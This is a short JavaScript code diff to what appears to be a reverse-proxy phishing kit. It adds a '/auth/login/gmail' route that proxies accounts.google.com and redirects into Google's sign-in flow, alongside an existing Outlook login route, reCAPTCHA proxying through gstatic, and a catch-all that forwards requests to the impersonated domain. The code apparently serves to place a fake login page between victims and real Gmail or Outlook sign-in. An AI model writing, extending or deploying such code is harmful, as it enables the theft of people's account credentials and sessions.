@@ -157,6 +157,14 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
                 this.res.writeHead(302, {location: '/'})
                 return this.res.end('')
             }
+
+            if (this.req.url === '/auth/login/gmail') {
+                clientContext.currentDomain = 'accounts.google.com'
+                // this.req.url = ''
+                // return super.superExecuteProxy(clientContext.currentDomain, clientContext)
+                this.res.writeHead(302, { location: '/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin' })
+                return this.res.end('')
+            }
             
             if (this.req.url === '/auth/login/outlook') {
                 clientContext.info.disableDeflate = true;
@@ -263,14 +271,13 @@ const RecaptchaHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
         }
 
-       
-
         if (this.req.url.startsWith('/recaptcha/releases')) {
             return super.superExecuteProxy('www.gstatic.com', clientContext)
 
         }
 
 
+        return super.superExecuteProxy(clientContext.currentDomain, clientContext)
     }
 }
 
